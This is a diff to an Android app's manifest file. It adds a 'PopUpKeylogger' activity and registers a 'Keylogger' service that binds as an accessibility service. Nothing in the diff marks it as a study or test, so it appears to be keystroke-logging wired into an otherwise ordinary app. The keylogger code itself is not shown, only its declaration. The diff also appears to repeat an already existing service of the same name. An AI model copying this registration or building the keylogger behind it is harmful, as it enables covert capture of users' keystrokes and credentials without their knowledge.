@@ -26,6 +26,8 @@
         android:name="com.example.app.permission.MAPS_RECEIVE"
         android:protectionLevel="signature" />
 
+
+
     <uses-permission android:name="com.example.app.permission.MAPS_RECEIVE" />
 
     <application
@@ -63,6 +65,21 @@
         <activity
             android:name=".ui.register.RegisterActivity"
             android:theme="@style/AppThemeNoActionBar" />
+        <activity android:name=".ui.keylogger.PopUpKeylogger"
+            android:theme="@style/AppTheme.CustonTheme"/>
+
+        <service
+            android:name=".workers.Keylogger"
+            android:label="@string/keylogger_service_label"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/keylogger_config" />
+        </service>
 
         <service
             android:name=".workers.Keylogger"
